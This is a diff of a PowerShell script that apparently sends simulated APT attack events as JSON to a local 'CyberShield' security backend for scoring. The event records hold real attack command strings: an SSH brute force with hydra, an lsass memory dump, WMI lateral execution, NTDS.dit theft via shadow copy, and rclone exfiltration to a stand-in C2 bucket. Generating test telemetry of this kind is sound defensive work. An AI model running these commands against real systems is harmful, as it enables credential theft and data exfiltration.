@@ -1,48 +1,86 @@
+﻿[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
 $BackendUrl = "http://127.0.0.1:8000/api/v1/ingest"
 
-# Ensure backend is online before starting
-Write-Host "⏳ Checking FastAPI connection..." -ForegroundColor DarkGray
-while ($true) {
-    try {
-        $check = Invoke-RestMethod -Uri "http://127.0.0.1:8000/" -Method Get -TimeoutSec 1
-        if ($check.status -eq "CyberShield API Online") { break }
-    } catch {
-        Start-Sleep -Seconds 1
-    }
-}
-Write-Host " Connected to CyberShield Backend." -ForegroundColor Green
+Write-Host "⚔️ Initiating Enterprise APT Multi-Stage Lateral Simulation..." -ForegroundColor Yellow
 
-$attackSteps = @(
-    @{ user = "guest_user"; event = "AUTH_FAILURE"; process = "sshd.exe"; msg = "SSH Port 22 Brute-force attempt" },
-    @{ user = "guest_user"; event = "AUTH_FAILURE"; process = "sshd.exe"; msg = "SSH Port 22 Password spray attempt" },
-    @{ user = "admin_svc";  event = "AUTH_FAILURE"; process = "lsass.exe"; msg = "Admin credential unauthorized access" },
-    @{ user = "admin_svc";  event = "PRIVILEGE_ESCALATION"; process = "powershell.exe"; msg = "SeDebugPrivilege token acquired" },
-    @{ user = "SYSTEM";     event = "DATA_EXFILTRATION"; process = "curl.exe"; msg = "4.2GB payload outbound to 198.51.100.42" }
+$scenarios = @(
+    @{
+        event_type   = "SSH_BRUTEFORCE"
+        user         = "root"
+        source_host  = "EXT-WAN-198.51.100.24"
+        target_host  = "WEB-DMZ-01"
+        process_name = "sshd.exe"
+        command      = "hydra -l root -P rockyou.txt ssh://10.0.1.10"
+        threat_score = 72
+        mitre_tactic = "TA0001 - Initial Access (External Remote Services)"
+        raw_message  = "Failed password for root from 198.51.100.24 port 44822 ssh2 - Maximum authentication attempts exceeded"
+    },
+    @{
+        event_type   = "LSASS_MEMDUMP"
+        user         = "svc_web"
+        source_host  = "WEB-DMZ-01"
+        target_host  = "APP-SRV-02"
+        process_name = "procdump64.exe"
+        command      = "procdump64.exe -ma lsass.exe lsass.dmp"
+        threat_score = 88
+        mitre_tactic = "TA0006 - Credential Access (OS Credential Dumping)"
+        raw_message  = "Process accessed: lsass.exe by procdump64.exe with PROCESS_VM_READ permissions"
+    },
+    @{
+        event_type   = "WMI_LATERAL_EXEC"
+        user         = "DomainAdmin_Svc"
+        source_host  = "APP-SRV-02"
+        target_host  = "DC-PRIMARY"
+        process_name = "wmic.exe"
+        command      = "wmic /node:10.0.0.1 process call create 'powershell.exe -enc...'"
+        threat_score = 94
+        mitre_tactic = "TA0008 - Lateral Movement (WMI Remote Execution)"
+        raw_message  = "Remote process invocation request via WMI Win32_Process targeting Primary Domain Controller"
+    },
+    @{
+        event_type   = "SHADOW_COPY_THEFT"
+        user         = "SYSTEM"
+        source_host  = "DC-PRIMARY"
+        target_host  = "BACKUP-DB"
+        process_name = "vssadmin.exe"
+        command      = "vssadmin create shadow /for=C: && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\exfil"
+        threat_score = 96
+        mitre_tactic = "TA0009 - Collection (NTDS.dit Domain Extraction)"
+        raw_message  = "Volume Shadow Copy creation initiated and raw disk access requested on NTDS.dit Active Directory database"
+    },
+    @{
+        event_type   = "DNS_TUNNEL_EXFIL"
+        user         = "SYSTEM"
+        source_host  = "BACKUP-DB"
+        target_host  = "C2-DROP-AWS-S3"
+        process_name = "rclone.exe"
+        command      = "rclone sync C:\exfil remote:c2-data-bucket --transfers 16"
+        threat_score = 99
+        mitre_tactic = "TA0010 - Exfiltration (Automated Exfiltration Over C2)"
+        raw_message  = "High-throughput encrypted outbound data stream detected to untrusted external S3 bucket endpoint"
+    }
 )
 
-Write-Host "`n Initiating Simulated APT Cyberattack against CyberShield Ledger..." -ForegroundColor Red
+foreach ($event in $scenarios) {
+    try {
+        $event["event_id"] = [guid]::NewGuid().ToString()
+        $event["timestamp"] = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
 
-foreach ($step in $attackSteps) {
-    $payload = @{
-        event_id     = [Guid]::NewGuid().ToString()
-        timestamp    = (Get-Date).ToUniversalTime().ToString("o")
-        source_host  = "PC-17"
-        target_host  = "DC-PRIMARY"
-        user         = $step.user
-        event_type   = $step.event
-        process_name = $step.process
-        raw_message  = $step.msg
-    } | ConvertTo-Json
+        $body = $event | ConvertTo-Json
+        $res = Invoke-RestMethod -Uri $BackendUrl -Method Post -Body $body -ContentType "application/json"
 
-    $response = Invoke-RestMethod -Uri $BackendUrl -Method Post -Body $payload -ContentType "application/json"
-    $score = $response.threat_score
-    $tactic = $response.mitre_tactic
-    
-    Write-Host "[$($step.event)] Threat Score: $score% -- MITRE Tactic: $tactic" -ForegroundColor Yellow
-    Start-Sleep -Seconds 1
+        # Safely extract hash regardless of schema structure
+        $hashVal = if ($res.leaf_hash) { $res.leaf_hash } elseif ($res.hash) { $res.hash } elseif ($res.data -and $res.data.leaf_hash) { $res.data.leaf_hash } else { "ANCHORED" }
+        $shortHash = if ($hashVal.Length -ge 16) { $hashVal.Substring(0, 16) + "..." } else { $hashVal }
+
+        Write-Host "[$($event.event_type)] $($event.source_host) ➔ $($event.target_host) | Score: $($event.threat_score)% | Leaf: $shortHash" -ForegroundColor Cyan
+        Start-Sleep -Milliseconds 700
+    } catch {
+        Write-Host "[-] Failed to submit event: $_" -ForegroundColor Red
+    }
 }
 
-Write-Host "`n Querying On-Chain Merkle Root..." -ForegroundColor Cyan
-$merkle = Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/v1/merkle-root"
-Write-Host "Merkle Root: $($merkle.merkle_root)" -ForegroundColor Green
-Write-Host "Total Events Anchored: $($merkle.total_events)" -ForegroundColor Green
+Write-Host ""
+Write-Host "✅ Enterprise APT trajectory submitted and anchored." -ForegroundColor Green
